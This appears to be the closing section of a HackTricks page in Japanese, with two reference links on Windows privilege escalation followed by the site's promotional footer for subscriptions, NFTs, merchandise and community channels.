[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
